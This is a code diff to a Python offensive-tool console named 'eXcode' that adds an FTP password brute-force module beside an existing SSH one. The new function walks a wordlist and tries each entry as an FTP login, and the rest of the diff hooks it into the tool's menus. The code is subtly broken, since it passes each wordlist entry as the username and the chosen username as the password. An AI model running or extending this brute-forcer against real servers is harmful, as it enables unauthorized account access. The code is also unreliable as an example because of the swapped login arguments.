@@ -9,6 +9,7 @@ import os
 from cryptography.fernet import Fernet
 from paramiko import SSHClient
 import paramiko
+from ftplib import FTP
 
 #-------------------------------------------------------------#
 
@@ -19,7 +20,7 @@ using = "nothing"
 HOST = "127.0.0.1"
 LPORT = ""
 PORT = 1234
-library_list = ["socket/server", "socket/client", "files/encrypt", "files/decrypt" , "ssh/pass"]
+library_list = ["socket/server", "socket/client", "files/encrypt", "files/decrypt" , "ssh/pass", "ftp/pass"]
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 if using == "socketS":
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -31,8 +32,10 @@ dec_file = ''
 keyfilename = ''
 wordlist = ''
 SSHPORT = 22
+FTPPORT = 21
 client = SSHClient()
 sshusername = ''
+ftpusername = ''
 #-------------------------------------------------------------#
 
 def baner():
@@ -286,6 +289,26 @@ def sshP():
         print("couldn't find the password")
 
 #------------------------bruteforce ssh-----------------------#
+#------------------------bruteforce ftp-----------------------#
+
+def ftpPass():
+    ftp = FTP(HOST)
+    ftp.port = FTPPORT
+    f = open(wordlist)
+    lines = f.readlines()
+    try:
+        for i in range(len(lines)):
+            passwordFTP = lines[i].strip()
+            try:
+                ftp.login(user = passwordFTP, passwd = ftpusername)
+                print("password found: " + Fore.GREEN + passwordFTP + Fore.RESET)
+                break
+            except:
+                print("password failed: " + Fore.LIGHTRED_EX + passwordFTP + Fore.RESET)
+    except:
+        print("failed")
+
+#------------------------bruteforce ftp-----------------------#
 
 baner()
 excodeInput = "eXcode> "
@@ -346,6 +369,9 @@ while True:
             elif use == str(library_list[4]):
                 excodeInput = "eXcode(" + Fore.RED + str(library_list[4]) + Fore.LIGHTGREEN_EX + ")> "
                 using = "sshP"
+            elif use == str(library_list[5]):
+                excodeInput = "eXcode(" + Fore.RED + str(library_list[5]) + Fore.LIGHTGREEN_EX + ")> "
+                using = "ftpP"
             elif use == "nothing":
                 using = "nothing"
                 excodeInput = "eXcode> "
@@ -421,7 +447,7 @@ while True:
                         print("can't find file")
             except:
                 print("error setting")  
-        elif using == "sshP":
+        elif using == "sshP" or using == "ftpP":
             try:
                 sshW = excode.split("set ",1)[1]
                 if sshW.startswith('Wlist '):
@@ -443,6 +469,7 @@ while True:
                 elif sshW.startswith('Username '):
                     try:
                         sshusername = sshW.split("Username ",1)[1]
+                        ftpusername = sshW.split("Username ",1)[1]
                     except:
                         print("error username setting")
                 elif sshW.startswith('Wordlist '):
@@ -455,6 +482,7 @@ while True:
         else:
             print("invalid set")  
 #------------------set is here------------------#
+#------------------show is here------------------#
     elif excode == "show":
         print("do you mean: 'show options' ?")
     elif excode.startswith('show '):
@@ -495,8 +523,14 @@ while True:
             print("PORT: " + str(SSHPORT))
             print("Wordlist: " + wordlist)
             print("Username: " + sshusername)
+        elif using == "ftpP":
+            print("HOST: " + HOST)
+            print("PORT: " + str(FTPPORT))
+            print("Wordlist: " + wordlist)
+            print("Username: " + ftpusername)
         else:
             print("you need to set a library.")
+#------------------show is here------------------#
     elif excode == "run":
         if using == "socketS":
             if HOST != "" and PORT != 0:
@@ -521,6 +555,11 @@ while True:
         elif using == "sshP":
             if  sshusername != '' and wordlist != '':
                 sshP()
+            else:
+                print("you need to set values to the files")
+        elif using == "ftpP":
+            if  ftpusername != '' and wordlist != '':
+                ftpPass()
             else:
                 print("you need to set values to the files")
         else:
